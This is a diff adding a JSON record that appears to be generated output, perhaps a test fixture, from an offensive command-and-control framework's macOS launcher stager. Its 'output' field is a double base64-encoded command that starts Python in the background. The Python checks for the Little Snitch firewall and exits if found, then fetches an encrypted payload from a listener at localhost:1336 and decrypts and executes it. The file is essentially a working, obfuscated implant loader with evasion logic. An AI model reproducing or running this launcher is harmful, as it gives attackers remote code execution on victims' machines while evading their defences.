@@ -1,0 +1,36 @@
+{
+  "options": {
+    "Base64": {
+      "Description": "Switch. Base64 encode the output.",
+      "Required": true,
+      "Value": "True"
+    },
+    "Language": {
+      "Description": "Language of the stager to generate.",
+      "Required": true,
+      "Value": "python"
+    },
+    "Listener": {
+      "Description": "Listener to generate stager for.",
+      "Required": true,
+      "Value": "listenerOne"
+    },
+    "OutFile": {
+      "Description": "File to output launcher to, otherwise displayed on the screen.",
+      "Required": false,
+      "Value": "/tmp/out.zip"
+    },
+    "SafeChecks": {
+      "Description": "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
+      "Required": true,
+      "Value": "True"
+    },
+    "UserAgent": {
+      "Description": "User-agent string to use for the staging request (default, none, or other).",
+      "Required": false,
+      "Value": "default"
+    }
+  },
+  "output": "ZWNobyAiaW1wb3J0IHN5cyxiYXNlNjQsd2FybmluZ3M7d2FybmluZ3MuZmlsdGVyd2FybmluZ3MoJ2lnbm9yZScpO2V4ZWMoYmFzZTY0LmI2NGRlY29kZSgnYVcxd2IzSjBJSE41Y3p0cGJYQnZjblFnY21Vc0lITjFZbkJ5YjJObGMzTTdZMjFrSUQwZ0luQnpJQzFsWmlCOElHZHlaWEFnVEdsMGRHeGxYQ0JUYm1sMFkyZ2dmQ0JuY21Wd0lDMTJJR2R5WlhBaUNuQnpJRDBnYzNWaWNISnZZMlZ6Y3k1UWIzQmxiaWhqYldRc0lITm9aV3hzUFZSeWRXVXNJSE4wWkc5MWREMXpkV0p3Y205alpYTnpMbEJKVUVVc0lITjBaR1Z5Y2oxemRXSndjbTlqWlhOekxsQkpVRVVwQ205MWRDd2daWEp5SUQwZ2NITXVZMjl0YlhWdWFXTmhkR1VvS1FwcFppQnlaUzV6WldGeVkyZ29Ja3hwZEhSc1pTQlRibWwwWTJnaUxDQnZkWFF1WkdWamIyUmxLQ2RWVkVZdE9DY3BLVG9LSUNBZ2MzbHpMbVY0YVhRb0tRcHBiWEJ2Y25RZ2RYSnNiR2xpTG5KbGNYVmxjM1FnWVhNZ2RYSnNiR2xpT3dwVlFUMG5UVzk2YVd4c1lTODFMakFnS0ZkcGJtUnZkM01nVGxRZ05pNHhPeUJYVDFjMk5Ec2dWSEpwWkdWdWRDODNMakE3SUhKMk9qRXhMakFwSUd4cGEyVWdSMlZqYTI4bk8zTmxjblpsY2owbmFIUjBjRG92TDJ4dlkyRnNhRzl6ZERveE16TTJKenQwUFNjdmJtVjNjeTV3YUhBbk8zSmxjVDExY214c2FXSXVVbVZ4ZFdWemRDaHpaWEoyWlhJcmRDazdDbkJ5YjNoNUlEMGdkWEpzYkdsaUxsQnliM2g1U0dGdVpHeGxjaWdwT3dwdklEMGdkWEpzYkdsaUxtSjFhV3hrWDI5d1pXNWxjaWh3Y205NGVTazdDbTh1WVdSa2FHVmhaR1Z5Y3oxYktDZFZjMlZ5TFVGblpXNTBKeXhWUVNrc0lDZ2lRMjl2YTJsbElpd2dJbk5sYzNOcGIyNDlRVGd5TTBwQmVVaEZPVUZRUTNWWlMyWkVjMnB4T1dWWE4wSkZQU0lwWFRzS2RYSnNiR2xpTG1sdWMzUmhiR3hmYjNCbGJtVnlLRzhwT3dwaFBYVnliR3hwWWk1MWNteHZjR1Z1S0hKbGNTa3VjbVZoWkNncE93cEpWajFoV3pBNk5GMDdaR0YwWVQxaFd6UTZYVHRyWlhrOVNWWXJKekpqTVRBelpqSmpOR1ZrTVdVMU9XTXdZalJsTW1Vd01UZ3lNVGMzTUdaaEp5NWxibU52WkdVb0oxVlVSaTA0SnlrN1V5eHFMRzkxZEQxc2FYTjBLSEpoYm1kbEtESTFOaWtwTERBc1cxMEtabTl5SUdrZ2FXNGdiR2x6ZENoeVlXNW5aU2d5TlRZcEtUb0tJQ0FnSUdvOUtHb3JVMXRwWFN0clpYbGJhU1ZzWlc0b2EyVjVLVjBwSlRJMU5nb2dJQ0FnVTF0cFhTeFRXMnBkUFZOYmFsMHNVMXRwWFFwcFBXbzlNQXBtYjNJZ1kyaGhjaUJwYmlCa1lYUmhPZ29nSUNBZ2FUMG9hU3N4S1NVeU5UWUtJQ0FnSUdvOUtHb3JVMXRwWFNrbE1qVTJDaUFnSUNCVFcybGRMRk5iYWwwOVUxdHFYU3hUVzJsZENpQWdJQ0J2ZFhRdVlYQndaVzVrS0dOb2NpaGphR0Z5WGxOYktGTmJhVjByVTF0cVhTa2xNalUyWFNrcENtVjRaV01vSnljdWFtOXBiaWh2ZFhRcEtRPT0nKSk7IiB8IC91c3IvYmluL3B5dGhvbjMgJg==",
+  "stager_name": "osx/launcher"
+}
